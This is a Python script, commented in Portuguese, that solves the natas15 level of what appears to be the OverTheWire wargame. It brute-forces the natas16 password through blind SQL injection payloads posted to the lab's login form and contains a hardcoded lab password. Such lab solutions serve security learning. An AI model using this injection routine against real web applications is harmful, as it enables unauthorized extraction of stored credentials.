import requests

# URL e credenciais de acesso
url ="http://natas15.natas.labs.overthewire.org/"
username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

# Dados de entrada
data = {}

# Senha resultante do Brute force
senha = str()

# Caracteres possíveis
letras = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# Iterando sobre a quantidade de caracteres da senha (32)
for d in range(1, 33):
    print(f"{d} of 32")
    
    # Iterando sobre cada uma das letras para cada um dos 32 caracteres da senha 
    for c in range(len(letras)):
        
        # Montando a query que será enviada ao site 
        if d == 1:
            data['username'] = '" UNION ALL SELECT 1,2 FROM users WHERE username = "natas16" AND substring(password,{},1) = BINARY "{}";#"'.format(d,letras[c]) 
            print(data['username'])      
        else:
            data['username'] = string + ' AND substring(password,{},1) = BINARY "{}";#"'.format(d,letras[c])
            
        # Enviando a requisição com as credenciais e a query
        response = requests.post(url=url,auth=(username, password),data=data)

        # Verifica se a resposta da query foi positiva, e caso seja, adiciona o caractere encontrado a senha e passa para o próximo caractere
        if "This user exists." in response.text:
            string = data['username'].split(';#')[0]
            print(letras[c])
            senha += letras[c] 
            break
        
# Mostra a senha final de 32 caracteres 
print(senha) 
